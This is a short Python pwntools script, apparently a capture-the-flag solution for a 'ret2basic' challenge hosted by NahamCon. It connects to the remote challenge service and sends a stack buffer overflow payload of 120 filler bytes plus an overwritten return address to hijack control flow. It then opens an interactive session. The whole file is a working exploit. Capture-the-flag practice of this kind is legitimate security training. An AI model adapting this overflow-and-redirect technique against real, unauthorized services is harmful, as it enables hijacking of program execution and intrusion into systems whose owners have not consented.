from pwn import *

#io = process("./ret2basic")
io = remote("challenge.nahamcon.com", "30413")

#0x0000000000401215
return_addr = p64(0x401215)
payload = b""
payload = b"A"*120 + return_addr
io.sendlineafter(":", payload)

io.interactive()
